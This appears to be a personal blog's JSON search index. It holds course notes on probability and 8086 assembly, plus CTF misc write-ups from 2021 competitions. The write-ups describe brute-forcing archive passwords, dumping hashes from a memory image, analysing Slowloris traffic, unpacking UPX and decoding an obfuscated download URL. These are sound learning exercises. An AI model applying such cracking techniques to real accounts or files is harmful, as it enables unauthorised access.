{"posts":[{"title":"平差","content":"1 ","link":"http://ayanagi.fun/pingcha/"},{"title":"大地测量学","content":"1 ","link":"http://ayanagi.fun/dadiceliangxue/"},{"title":"遥感","content":"1 ","link":"http://ayanagi.fun/yaogan/"},{"title":"概率论与数理统计","content":" 分布函数是F(x)，密度函数是f(x)，已知F使用求导求f，反之使用积分 Fx就从定义域出发，分界直接代入得到参数的方程，解方程即可 F(-∞)=0，F(+∞)=1,F(上分段)=F(下分段) fx先清楚它在R内的积分=1，那么以定义域区分上下限算积分即可 求分布律，有手就行 已知X分布列，求Y分布列 根据X的取值代入Y的取值，将X换成Y，能合并简化的概率就合并 已知Fx求Fy 先把Y=λX写成X=?Y 然后直接代入Fx里 如果Y中有负号，Fy(Y)=1-Fx(?y)，没有则直接Fy(Y)=Fx(?y) 已知fx求fy 写出X=?Y 直接代入fx 令fy=(?y)'·fx(?y) 判断?y是否有负号，有则fy=-fY，无则fy=fY 均匀分布，求P P=满足要求长度/总长度 正态分布图像，σ越小图像越陡峭 均匀分布U[a,b] 二项分布B[n ,p] 指数分布E(λ) 已知F(x,y)求f(x,y) 每个区间对其求x偏导再求y偏导 得到的函数根据再区间合并 已知F(x,y)求P 将X,Y的范围化成(x&lt;=a,y&lt;=b)，P=F(a,b) 已知f(x,y)求P 1.找x和y不等于0时的范围 2.找出要求概率的范围，添加到上步范围，保证至少一个未知数的上下限都是纯数字 x范围的上下限记为a,b y范围的上下限记为c,d x的上下限都是纯数字则先对y积分再对x积分，积分上下限就是对应变量范围的上下限。 F(x,y)或f(x,y)中含有的未知数 F就代入四个点：F(+∞,+∞)=1，F(-∞,-∞)=0，F(x,-∞)=0，F(-∞,y)=0可以列出方程 f(x,y)的话对其进行上下限都是无穷大的二重积分，并且结果一定为1 根据x,y的范围替换上下限计算积分即可得到关于未知数的方程进而求解 求均匀分布的f(x,y)与P 区域D服从均匀分布，f(x,y)=1/A，x∈D(A是D的面积)，0，其他 P(x,y∈D1)=A1/A，A1是D1与D重合的面积 求边缘分布函数Fx(X),Fy(Y) Fx(X)=F(x,+∞) Fy(Y)=F(+∞,y) 求边缘密度函数fx(X),fy(Y) 1.将f(x,y)非零区域画出 表示出左右边界上下边界x=g1(y),x=g2(y),y=h1(x),y=h2(x) fx(X)就是f(x,y)对y的积分，上下限就是h1和h2,fy(Y)同理 判断连续型二维变量的独立性 F(x,y)=Fx(X)·Fy(Y) f(x,y)=fx(X)·Fy(Y) 则X、Y相互独立，不相等，则不相互独立 已知f(x,y),Z=X+Y，求fz(Z) fz(Z)=f(x,z-x)在-∞，+∞对x的积分 分类讨论z的范围，最后求积 已知f(x,y) Z=X/Y，求fz(Z) fz(Z)=f(yz,y)·|y|在-∞，+∞对y的积分 分类讨论z的范围，最后求积 给出F，求Z=max(X,Y)的分布函数，XY独立同分布 Fz(Z)=Fx(Z)·Fy(Z) 独立同分布的意思就是XY相互独立，Fx(X)在形式上与Fy(Y)相同 给出F，求Z=min(X,Y)的分布函数，XY独立同分布 Fz(Z)=1-[1-Fx(Z)]·[1-Fy(Z)] 求离散型的期望E(X) E(X)=∑xipi 求连续型的期望E(X) 给出密度函数，E(X)=xf(x)在-∞,+∞对x的积分 Y=g(X)求E(Y) 离散型E(Y)=∑g(xi)pi 连续型E(Y)=g(x)·f(x)在-∞,+∞对x的积分 求方差D(X) 切比雪夫不等式 ","link":"http://ayanagi.fun/gailvlun/"},{"title":"GIS","content":"1 ","link":"http://ayanagi.fun/GIS/"},{"title":"微机原理","content":"事态紧急，还请允许我直接贴ppt。 第一章 数制转换 0-9的ASCII码为:30-39H A-F的ASCII码为:41-46H 回车的ASCII码为:0DH 换行的ASCII码为:0AH 码制 有符号数的原码的最高位为符号位，数值位部分是数的绝对值。 有符号数的反码最高位也是符号位，数值部分对于正数是绝对值，对于负数是绝对值按位取反。 +23的反码:00010111 -23的反码:11101000 有符号数的补码，正数和原码反码相同，负数的数值位部分为其绝对值按位取反后末位**+1**所得，也就是负数的补码等于负数的反码+1。 计算机系统组成 硬件：中央处理器CPU、存储器系统、I/O接口、电源系统、I/O设备 CPU：即微处理器，主要组成：运算器和控制器。 总线：总线是CPU与存储器、I/O接口交换信息的公共通道。 第二章 6个标的作用 1、进位标志CF(Carry Flag) 如果运算结果的最高位产生了一个进位或错位，那么，其值为1，否则其值为0 2、奇偶标志(Parity Flag) 由于反应运算结果中(转化为二进制)，&quot;1&quot;的奇偶性，也就是个数。&quot;1&quot;的个数为偶数，PF为1。个数为奇数，PF为0. 补充：只包含最低位的一个字节(二进制的后八位) 3、辅助进位标志AF(Auxiliary Carry Flag) 在发生下列情况时，AF的值为1，否则其值为0 (1)、在字操作时，发生低字节向高字节进位或错位时； (2)、在字节操作时，发生低4位向高4位进位或错位时； 4、零标志ZF(Zero Flag) ZF用来反映运算结果是否为0 如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可用此标志位 5、符号标志SF(Sign Flag) SF用来反映运算结果的符号位，它与运算结果的最高位相同 6、溢出OF(Overflow Flag) OF用于反映有符号数加减运算所得结果是否溢出 如果运算结果超过当前运算所能表示的范围，则为溢出，OF的值为1，否则，OF为0 物理地址 实模式下，物理地址=段基址x16+偏移地址 1000变成10000的原因:段基址为1000，物理地址=段基址(1000)x16+偏移地址 因为是16进制，所以x16就是进一位，变成了10000。 第三四章 MUL的目的操作数是AX(隐含) MOV AL,0B4H MOV BL,11H MUL BL 为求B4*11的结果,DIV也是一样 DOS功能调用 01H：等待键入一个字符，有回显，响应Ctrl_C。 02H：显示一个字符，响应Ctrl_C。 入口参数DL=待显示字符的ASCII码。 第六章 32K=210∗2532K=2 ^ {10} *2 ^ 532K=210∗25，1K=2101K=2^{10}1K=210,32=2532=2^532=25 第七章 第八章 外部中断 80X86 CPU有2个引脚(INTR和NMI)可以接收外部的中断请求信号。由输入到INTR引脚的中断请求信号引发的中断称为可屏蔽硬件中断。由输入到NMI引脚的中断请求信号引发的中断称为非屏蔽硬件中断。 内部中断 由CPU内部事件,即由CPU硬件故障或程序执行中的指令所引发的中断称为内部中断。内部中断可以进一步分为软件中断和异常。 执行有定义的INT N指令而引发的中断称为软件中断。软件中断可分为BIOS中断、DOS中断。DOS中断又分为DOS专用中断、DOS保留中断、用户可调用的DOS中断以及保留给用户开发的中断。 由于CPU本身故障、程序故障等引发的中断，称为异常。 在实模式下，中断向量表需设置在系统的RAM最低端的1K单元(00000H ～ 003FFH) 日时钟中断向量 08H,1CH 用户中断向量 71H,0AH 键盘中断向量 09H 中断向量的引导作用：用户程序执行到中断向量时取入口段的段基址，中断向量的偏移地址→IP、CS，执行中断向量的服务程序，IRET返回后回到有效地址。 80X86响应中断的优先级最高为除法错中断。最低为单步中断。 禁止中断：字面意思。 中断屏蔽：封锁部分中断，其余部分仍有响应。 中断嵌套。 中断系统应该具备的基本功能 硬件中断的接口电路应该具备屏蔽和开放的功能，由程序员通过软件去控制。 能实现中断排队，优先响应高级别的中断源。 能够实行中断嵌套。 响应中断后，能顺利完成中断功能。 80X86中断指令 开中断 STI：F寄存器I标置1 关中断 CLI：F寄存器I标置0 软件中断 INT n：无条件转向n型中断服务子程序。 INT n的执行过程 1.F寄存器入栈，F的T、I标置零，禁止单步操作、使CPU处于关中断状态。 2.断口地址入栈，CS为基地址，先进，IP为断口偏移地址，后进 3.CPU从4n~4n+3单元取出n型服务入口地址→IP:CS从而转入n型中断服务程序 中断返回指令IRET：依次从栈顶弹出6个元素→IP,CS,F 如果栈顶是INT n的断口地址，则执行IRET后返回断点，否则不能。 实模式下，所有中断向量集中存放在系统RAM最低端的1024个单元之中，物理地址为0H~3FFH n型中断向量的内存地址为4n~4n+3。存放的内容按照从低到高形成子程序的入口地址，子程序的入口物理地址为入口地址的相加。例如入口地址为5030H:3800H,则入口物理地址为50300H+3800H=54B00H 主8259接受了中断后从主8259送一个中断结束命令字20H MOV AL,20H之后 需要OUT 20H,AL IRET 从的话要给主从都发一个，从的中断结束命令寄存器口地址是A0H。 MOV AL,20H OUT 20H,AL OUT 0A0H,AL;这里的0A0H不是颜文字，而是代表16进制。 IRET 实现用户中断需要对主从8259编程。 IN AL,0A1H AND AL,11111101B OUT 0A1H,AL;开放用户中断 IN AL,21H AND AL,11111011B OUT 21H,AL;开放从8259中断 非屏蔽中断 输入到CPU的NMI引脚的中断请求信号引发的中断。 条件：有非屏蔽中断请求，没有DMA请求；一条指令执行完 可屏蔽中断 INTR引脚。 DMA请求级别高于非屏蔽高于可屏蔽中断。 条件：有可屏蔽中断请求，没有DMA，没有非屏蔽中断请求；一条指令执行完；CPU处于开中断，即I标=1 中断程序设计 中断向量的读写、硬件中断通路的开放屏蔽。 08H中断向量置换：读中断向量，保存系统资源 READ08 PROC MOV AX,3508H INT 21H MOV WORD PTR OLD08,BX MOV WORD PTR OLD08+2,ES RET READ08 ENDP 定义用户中断服务于程序为“0AH型”置换0AH型中断向量,调用DOS系统25H号子程序把用户中断的服务程序入口地址写入4×0AH～4×0AH＋3单元。 定义用户中断服务程序为“71H型” ，置换71H型中断向量,调用DOS系统25H号子程序把用户中断的服务程序入口地址写入4×71H～4×71H＋3单元。 0AH的话只需要向主8259送结束命令 71H主从都要发 第九章 异步串行通信的数据传输方式：单工通信、半双工通信、全双工通信 。 为实现通信，收发双方数据帧的格式和通信速率要保持一致。 数据传送速度：并行通信 &gt; 串行同步通信 &gt; 串行异步通信 异步通信一帧数据格式中，按照发送的次序，先传送__起始位__，紧接着是数据位，数据位后为__校验位__，最后为停止位。 起始位1位逻辑0，奇偶校验位0~1位，0或1，停止位，1、1.5、2位的1 8250初始化编程 主串口是3F开头，辅串口2F开头 高8位3F9H,低8位3F8H，写除数后可以算出分频系数。 MOV DX,3F9H MOV AL,00H OUT DX,AL MOV DX,3F8H MOV AL,60H OUT DX,AL 上段写入了高8位00H，低8位60H，结合上表可以得到波特率。 第十章 方式选择命令字 10000011 汇编代码 MOV AL,83H OUT 控口地址,AL 1000，后面前两个0是控制A口的方式，可以是00为0,01为1,10为2 第三个0控制的是A口输出/输入，0为输出，1为输入。 0011 第一个0控制的是PC7~4的方式是输出，1为输入 第二个0控制的是B口的工作方式，0则是0,1则是1 第三位是1，控制B口的输入还是输出，1是输入，0是输出。 最后一位的1控制PC3~0的方式为输入。 将汇编代码的十六进制数转换成二进制之后对应每一个比特位的状态判断8255的工作方式。 第十一章 8254 8254初始化 口地址200-203H,2号CLK 4MHz，要求2号计数器输出2KHz方波，初始化补充完整 MOV DX,203H MOV AL,10110110B OUT DX,AL MOV AX,2000 ;4M/2000=2K MOV DX,202H OUT DX,AL MOV AL,AH OUT DX,AL 203H就是控制的口地址， 10110110从左到右，10是选择2号计数器，11是按照顺序先低8位后高8位。011工作方式是3,0代表二进制计数。 ","link":"http://ayanagi.fun/weijiyuanli/"},{"title":"2021第六届全国网络空间安全大赛 misc wp","content":"流量分析是一血，感觉还不错，有些题目有些比较抖机灵的部分吧。 RGB 附件code.txt，打开是图片的RGB值，稍微修改一下数据令其为R,G,B形式的格式，看了一下有28864行，分解一下，第一次试的是164*176，出来一个乱图，那么换一下xy，脚本如下 from PIL import Image x = 176 y = 164 im = Image.new(&quot;RGB&quot;, (x, y)) file = open('code.txt') for i in range(0, x): for j in range(0, y): line = file.readline() rgb = line.split(&quot;,&quot;) im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) im.show() 得到的flag保存为图片，扔进imagemagick里flop一下 flag{c1d836d1db9d42dd} zip 爆破，一开始没做出来，先后采用了1-8位纯数字和1-8位大写字母和数字组合，没有尝试小写字母数字组合，后来再试得到密码ff123，解压得到txt文件和加密的文档，txt文件内容得知考点应该是0宽和培根，培根解得文档密码xyj，打开文档复制全部内容解密，发现并不是0宽，在文档里全选修改字体颜色为红色发现flag。flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0} Memory_1 附件val.vmem，在volatility里查看信息 vol.py -f val.vmem imageinfo Win7SP1x64系统，先看一下pslist，发现一个cscript.exe比较可疑，猜测是文件名，拿去md5提交错误，那么查看cmdline，发现Command line : cscript &quot;C:\\Windows\\TEMP\\UEAOGWBdwyydm.vbs&quot; 那么病毒文件应该就是UEAOGWBdwyydm.vbs了 flag{24060da3d327991115a96e7099da25c3} Memory_2 hashdump查看用户列表，有一个test$，带$的就是隐藏用户，作为flag的md5的前半段，另一个是来源进程，那么就需要知道什么进程使其添加账号。使用psscan查看隐藏起来的进程，多了比较可疑的net1.exe、 KiiKCuSco.exe，分别尝试，发现前者正确。 flag{45321c07f425d915c55424957353dd07} Slowloris 流量分析，wireshark打开，搜索http和POST字符串，寻找POST请求包追踪HTTP，导出对象为HTTP，没发现什么，搜索题目Slowloris得知为slowloris拒绝服务攻击，看到许多GET包头只有一个CLRF，证实了这一点,并且GET包的destination都是195.8.178.227。那么攻击方式就是slowloris了，这里运气比较不错，s取了小写，slowloris/195.8.178.227的md5值就是flag flag{3fc9d4a929cb690728d2b76c76483abe} pack!pack!pack! exe文件，双击打开提示缺少dll，到网上下了一个dll，打开没什么东西。扔进exeinfope发现有upx壳，在kali下脱壳报错，搜索错误信息，获得upxf工具修复文件后再次脱壳，成功，在kali下直接打开脱壳后的exe归档文件，结合题目的resource描述，进入.rsrc文件夹发现string.txt，拖出来得到flag的前半部分flag{0bed66d154ccbdd0，其他文件夹再浏览一下发现一个比较可疑的138.bmp，扔进winhex发现最后面有base64串N2E2MzQyYWJmOTdhNWNmY30=，解得7a6342abf97a5cfc}组合起来得到完整的flag flag{0bed66d154ccbdd07a6342abf97a5cfc} ","link":"http://ayanagi.fun/cstc2021/"},{"title":"V&N CTF2021 misc 简要复现","content":"当时懒得折腾。主要是口腔溃疡加上下雨，基金暴跌，心情不是很好。加上各种压力感觉有点力不从心了，也少了以前学习的那份冲劲。 颓废。 冰冰好像藏着秘密 损坏的压缩包一枚，修复解压得FFT.png看图片名应该就是要傅里叶变换取得盲水印了吧，不过一开始没注意就扔进自动机里爆了，出来了个假flag，交上去wa了就没管了。 理解并抄下FFT脚本 import cv2 as cv #opencv库，对图像处理必备 import numpy as np #numpy库，同样 import matplotlib.pyplot as plt #matplotlib库，作图必备 img = cv.imread('FFT.png', 0) #右键查看图片的时候可以发现只有8位深，直接读为灰度图像 f = np.fft.fft2(img) #做频率变换 fshift = np.fft.fftshift(f) #转移像素做幅度谱 s1 = np.log(np.abs(fshift))#取绝对值：将复数变化成实数取对数的⽬的为了将数据变化到0-255 plt.subplot(121) plt.imshow(img, 'gray') plt.title('original') plt.subplot(122) plt.imshow(s1,'gray') plt.title('center') plt.show() Do_you_like_Rhythm_Doctor 使用节奏医生编辑器打开文件，节拍分为矩形波形，猜测01组合，一行一行进行，抄下节拍内容二进制转字符 flag{W31come_V&amp;N_CTF} interesting_fishing 套娃蛮多的，主要学习到的知识是eml文件相关、RTF下的unicode编码。 把bin改为eml，用的是foxmail打开得到图片和压缩包。取得两个文件，图片扔oursecret得到第二部分flag， 压缩包解压，查看工程文件，发现假flag，生成文件后报错发现powershell命令执行，去找Browse.VC.db，文件夹选项里把隐藏文件显示打开，在\\giveyourflag\\giveyourflag\\x64\\Debug目录下可以看到Browse.VC.db文件，记事本打开，将里面的b64串解密，得到 \\u-65432?\\u-65420?\\u-65420?\\u-65424?\\u-65421?\\u-65478?\\u-65489?\\u-65489?\\u-65418?\\u-65426?\\u-65437?\\u-65420?\\u-65434?\\u-65491?\\u-65486?\\u-65487?\\u-65485?\\u-65491?\\u-65487?\\u-65486?\\u-65483?\\u-65481?\\u-65488?\\u-65482?\\u-65487?\\u-65487?\\u-65486?\\u-65485?\\u-65490?\\u-65437?\\u-65425?\\u-65421?\\u-65490?\\u-65439?\\u-65424?\\u-65491?\\u-65426?\\u-65439?\\u-65426?\\u-65430?\\u-65431?\\u-65426?\\u-65433?\\u-65490?\\u-65427?\\u-65415?\\u-65423?\\u-65437?\\u-65428?\\u-65425?\\u-65419?\\u-65436?\\u-65490?\\u-65437?\\u-65425?\\u-65427?\\u-65489?\\u-65456?\\u-65415?\\u-65425?\\u-65426?\\u-65433?\\u-65415?\\u-65439?\\u-65426?\\u-65433?\\u-65499?\\u-65486?\\u-65488?\\u-65421?\\u-65420?\\u-65425?\\u-65422?\\u-65435?\\u-65421?\\u-65499?\\u-65486?\\u-65488?\\u-65428?\\u-65425?\\u-65417?\\u-65499?\\u-65486?\\u-65488?\\u-65425?\\u-65426?\\u-65499?\\u-65486?\\u-65488?\\u-65434?\\u-65425?\\u-65422?\\u-65435?\\u-65431?\\u-65433?\\u-65426?\\u-65499?\\u-65486?\\u-65488?\\u-65433?\\u-65425?\\u-65425?\\u-65436?\\u-65421?\\u-65499?\\u-65486?\\u-65488?\\u-65439?\\u-65427?\\u-65431?\\u-65436?\\u-65499?\\u-65486?\\u-65488?\\u-65458?\\u-65425?\\u-65422?\\u-65420?\\u-65432?\\u-65499?\\u-65486?\\u-65488?\\u-65461?\\u-65425?\\u-65422?\\u-65435?\\u-65439?\\u-65426?\\u-65499?\\u-65486?\\u-65488?\\u-65469?\\u-65457?\\u-65450?\\u-65463?\\u-65468?\\u-65491?\\u-65487?\\u-65479?\\u-65499?\\u-65486?\\u-65488?\\u-65424?\\u-65439?\\u-65422?\\u-65439?\\u-65426?\\u-65425?\\u-65431?\\u-65439?\\u-65490?\\u-65422?\\u-65439?\\u-65422? 这是RTF格式下的unicode编码，原理是RTF格式中使⽤\\uN?表示⼀个unciode字符。\\u后跟⼀个带符号的16位⼗进制整数值接⼀个占位符，⽤？表示。N⼤于32767的话，则表示为负数。解混淆示例如下： L&quot;h&quot; == 0x0068 == -(-0x0068) == -(0xFFFF+1-0x68) == -65432=\\u-65432? 按照规则转换数据得到一个rar的URL，下载打开右边提示4位数字，rar5压缩方式，使用hashcat或者Accent RAR Password Recovery都可以。 解压出一个docx，直接改后缀解压，敏感文件hideinfo.xml，winhex看到0宽，记事本复制出来解。 vnctf{APT_1S_c0M1nG_fr0m_l@z@RuS} HAPPYNEWYEAR chinese code和谢赫语言密码的编码，使用在线编码全家桶https://www.dcode.fr/zh-CN 解压得到happynewyear.png，stegpy爆破一把梭，用的是L1师傅做的脚本 https://github.com/L1near/CTFpics-1/blob/master/webpsteg.py VNCTF{HappyNewY3a5} ","link":"http://ayanagi.fun/VNCTF2021/"},{"title":"ACTF2021Misc 复现&wp","content":"面向新生的一个比赛，但是还是没法都做出来，没有以前笨笨的那股冲劲了，其实还是遇到了瓶颈。 Real_way 思路应该是找到和路径文件夹名顺序相同的flag。懒得做了，直接看wp: 五层目录，每层目录中有7个文件夹，且每个叶子节点上都有一个 flag.txt 文件，所以总共是16,807 个flag.txt文件夹 仔细一看就能看出来文件夹的命名都很简单，flag中的密文也很简单，也很有对应关系 这些个flag文件中只有一个是正确的，何谓正确的呢，就是它密文和它文件所在的路径相同 编写脚本如下 import os import random m=[] for i in range(7): m.append(chr(ord('a')+i)) print(&quot;Êý¾ÝÁ¿£º&quot;+str(m)) strmap=[] flag_map=[] for i1 in m: for i2 in m: for i3 in m: for i4 in m: for i5 in m: temp=i1+'\\\\'+i2+'\\\\'+i3+'\\\\'+i4+'\\\\'+i5 strmap.append(temp) temp=i1+i2+i3+i4+i5 flag_map.append(temp) #print(strmap) def makemap(level,list_map): if level&gt;0: level-=1 makemap def makedir(): for p in strmap: this='D:\\\\CTF\\\\QuestsAndWriteUps\\\\ACTF\\\\Real_way' #path=os.path.abspath('.')+'\\\\misc_test\\\\'+p path=this+'\\\\ACTF\\\\'+p os.makedirs(path) temp=open(path+'\\\\flag.txt','w') temp.write('actf{'+flag_map[random.randint(0, len(strmap)-1)]+'}') def checkflag(): basepath='D:\\\\CTF\\\\QuestsAndWriteUps\\\\ACTF\\\\Real_way' #basepath=os.path.abspath('.') ans=[] for i in range(len(strmap)): path=basepath+'\\\\ACTF\\\\'+strmap[i]+'\\\\flag.txt' file=open(path,'r') flag=file.readline() if flag_map[i]==flag[5:flag.find('}')]: #print(flag) ans.append(flag) #else: #print('error ' +flag_map[i]+' : '+flag[5:flag.find('}')]) #print(flag[5:flag.find('}')]) file.close() return ans if __name__=='__main__': #makedir() print('Ä¿Â¼É¨Ãèing') ans=checkflag() print(ans) 与熊论道 解与熊论道，解社会主义核心价值观，得pwd:123456，附件里有bmp，wbs43open解，一分钟就出来的题。ps:和上一题难度差距居然如此之大。 ACTF{PXY_wants_@_bOyfri3nd} 禁止摸鱼 扔winhex，尾巴zip，暴力得flag.txt，密码是3位的，而且还是弱口令:123，我从第1位开始爆破的，一瞬间就出了，有师傅从4位密码开始爆，爆了很久都没出。ps:和第一题难度差距竟如此之大。 纳什均衡 nc上去玩了一下，意思就是给若干个石头，你每次可以去除一些，对方也可以去除一些，双方去除的最大数量相同。你先行动，谁先去除到最后一个石头谁就赢了。要连胜5局才能得到flag。蕴含高深知识的看起来简单但是其实很难的游戏。思路挺有趣的，也有深度，奈何自己脑子笨，且不会写代码，最多玩到过第三局就没了，搜了下题目，博弈论。各种文章写得天花乱坠的，看不懂，也浮躁不想钻研。 看wp，写的居然是巴什博奕，巴什就巴什为啥题目要叫纳什(强大的ACTF主办方应该不会犯这种错误吧，肯定是我水平太低无法理解此中深意)，而且如果我要是搜的是巴什就直接做出来了() 以下是百度百科的规范描述思路，只要知道是这么一回事很快就能做出来。也算一些课外知识吧。 巴什博弈：只有一堆n个物品，两个人轮流从这堆物品中取物，规定每次至少取一个，最多取m个。最后取光者得胜。 显然，如果n=m+1，那么由于一次最多只能取m个，所以，无论先取者拿走多少个，后取者都能够一次拿走剩余的物品，后者取胜。因此我们发现了如何取胜的法则：如果n=（m+1）r+s，（r为任意自然数，s≤m),那么先取者要拿走s个物品，如果后取者拿走k（≤m)个，那么先取者再拿走m+1-k个，结果剩下（m+1）（r-1）个，以后保持这样的取法，那么先取者肯定获胜。总之，要保持给对手留下（m+1）的倍数，就能最后获胜。 ","link":"http://ayanagi.fun/ACTF2021/"},{"title":"0基础的Re基操","content":"先占坑。不包含基础/前置理论知识(算法，汇编之类的，个人喜欢先摸题目，有一定积累之后再切入到理论的理解反而会有柳暗花明与茅塞顿开之感。) 学到多少写多少。以题目为例 1.IDA打开SHIFT+F12查看字符串 例题：BUUCTF easyre 下载附件拖进IDA，SHIFT+F12呼出Strings Window可以看到flag ","link":"http://ayanagi.fun/Reverse/"},{"title":"Hgame2021 misc WP+复现","content":"1305分，只拿了总分一半不到。厮混了半年水平竟如此半吊子，心中还是失落更多，但是步伐不会停下。有懊恼，因为搜索引擎使用方式不恰当而和400分失之交臂。 Week1 Base全家福 R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09 解b64，解b32，解b16 其实使用basecrack就能实现自动base机 python basecrack.py --m python basecrack.py -h [FOR HELP] [&gt;] Enter Encoded Base: R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09 [-] Iteration: 1 [-] Heuristic Found Encoding To Be: Base64 [-] Decoding as Base64: GY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ====== {{&lt;&lt;======================================================================&gt;&gt;}} [-] Iteration: 2 [-] Heuristic Found Encoding To Be: Base32 [-] Decoding as Base32: 6867616D657B57653163306D655F74305F4847344D335F323032317D {{&lt;&lt;======================================================================&gt;&gt;}} [-] Iteration: 3 [-] Heuristic Found Encoding To Be: Base16 [-] Decoding as Base16: hgame{We1c0me_t0_HG4M3_2021} {{&lt;&lt;======================================================================&gt;&gt;}} [-] Total Iterations: 3 [-] Encoding Pattern: Base64 -&gt; Base32 -&gt; Base16 [-] Magic Decode Finished With Result: hgame{We1c0me_t0_HG4M3_2021} [-] Finished in 0.0023 seconds hgame{We1c0me_t0_HG4M3_2021} 不起眼压缩包的养成方法 因为压缩算法的问题被卡了一整天。一道非常简单的题。 点开地址，一张图片，右键保存下来，直接binwalk出压缩包，需要解压密码，旁边注释是8位数字，爆破之 PW:70415155，得到plain.zip和NO PASSWORD.txt 高能来了，一看就知道是明文攻击，使用archpr折腾了n久一直报错，而且我也知道是压缩方式/软件之类的和出题人不一样，当时想着是知道出题人使用的压缩软件就能出来，后来各种查询资料，发现一个师傅做明文攻击的wp用的这种方式：把原来压缩包里的NO PASSWORD.txt删除，再把已经有的NO PASSWORD.txt扔进去，结果：失败。甚至怀疑是不是错了。看txt的内容，以为是0宽，扔进去也不是。毕竟第一周的签到以外，咋能难到哪里去，肯定不是。不能高估了题目。在bandzip压缩的时候看到的压缩方式，有个storage，txt里也提到了这个，使用storage方式压缩制造明文档案即可。 PW:C8uvP$DP，得到flag.zip，这次总该是伪加密了吧。伪加密解之，得到一串字符，其实不用伪加密也可以，zip直接丢winhex就能看到flag.txt里的内容，是一堆看起来像是utf-8编码的东西，但是解了发现并不是，是html编码，解码之。 hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d} Galaxy 流量分析，wireshark打开，搜索http协议，找到两个GET方法，随便追踪一个HTTP流，发现访问了一张百度图片，那么导出对象为http，选中galaxy.png，save，得到一张图片，扯进kali发现是打不开的，那必然是改宽高。一改就行了。 hgame{Wh4t_A_W0nderfu1_Wa11paper} Word Re:MASTER 一个压缩包，解压出2个docx:first.docx、maimai.docx，都丢进winhex，在发现maimai.docx是加了密的文档，尾部还有提示。所以直接把first.docx改后缀为zip找到一个password.xml，扯进winhex发现brainfuck，解得maimai.docx的文档密码: DOYOUKNOWHIDDEN? 解开，直接就能发现一堆空格(因为我的word默认是显示所有隐藏的东西的)，全选之后清除格式，然后复制，word里有张图片内容和雪有关(喜欢！雪！真实的魔法)，那必然是snow隐写，把这堆空格放进flag.txt SNOW.EXE -C flag.txt hgame{Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX} 至此，第一周misc题目AK，wp完成时间2021年1月31日15:03:38 Week2 Tools 拿了一血，有点小高兴。 附件zip一个，解压出F5.7z和Matryshka.jpg，图片的内容是一个套娃(字面意思)，但是题目本身也算套娃。压缩包带密码，密码肯定就是从图片来了，肯定是F5隐写，而且binwalk的时候可以看到一行带copyright的串，也明示了是F5隐写，F5隐写的密码从右键属性的详细信息得到。 !LyJJ9bi&amp;M7E72*JyD 那么 java Extract Matryoshka.jpg -p '!LyJJ9bi&amp;M7E72*JyD' 得到output.txt的内容为 e@317S*p1A4bIYIs1M 从7z解压出Steghide.7z和01.jpg，图片是张二维码的1/4，一看就知道最后要拼起来，肯定是Steghide隐写了，密码都是右键得到。 A7SL9nHRJXLh@$EbE8 steghide extract 01.jpg Enter passphrase: wrote extracted data to &quot;pwd.txt&quot;. pwd.txt的内容为 u0!FO4JUhl5!L55%$&amp; 从7z解压出Outguess.7z和02.jpg，那就outguess咯。 outguess -r 02.jpg -t out.txt -k z0GFieYAee%gdf0%lF out.txt的内容为 @UjXL93044V5zl2ZKI 从7z解压出JPHS.7z和03.jpg，那就JPHS咯。 两个空都要填上rFQmRoT5lze@4X4^@0 保存为01.txt，其内容为xSRejK1^Z1Cp9M!z@H 解压得到04.jpg 使用画图拼合4张裂开的二维码扫码即可得到flag hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful} Telegraph 小题大做了。直接扔audacity，查看频谱，发现几个大字：850Hz。第一感觉竟然是去年roarCTF那个FM，甚至去配了gqrx-sdr去分析，啥也没得到。搞了半天浪费了特别多时间。应该是走进死胡同了。 一看文件名是中文电码，解码后得到：带通滤波器。搜了一通之后啥也没得到。这个hint其实有些误导 最后面简单粗暴的解法是：audacity直接播放音频，一段音乐过后能够听到摩斯电码。鼓捣一下频谱能够发现确实有摩斯电码，直接解码就能得到flag，后知后觉才知道850Hz是告诉你摩斯电码的大概位置。 YOURFLAGIS4G00DS0NGBUTN0T4G00DMAN039310KI flag:hgame{4G00DS0NGBUTN0T4G00DMAN039310KI} Hallucigenia 一张图片，丢winhex，屁股正常，stegsolve查看lsb通道，正常，更改滤镜，发现一张二维码，扫描得到 gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk= 一看就b64，转换得到一个 注意82 60，是png的屁股的倒序。而且是按照字节单位来倒序的，导致我的逆序脚本不好使了，当时又折腾了好些时间打算写个脚本，但是菜鸡如我，不会写。当机立断手搓，直接反过来手抄图片，粘贴进010editor保存为1.png，是个镜像反转的flag，imagemagick伺候 Transform→flop得到 hgame{tenchi_souzou_dezain_bu} DNS 这题又学到了流量分析的一个题型。很不错。 第一次遇到DNS流量分析，wireshark打开，一通操作啥也没出来。稍微查了下DNS流量分析之类的东西，学习了一些关于DNS的知识，那么 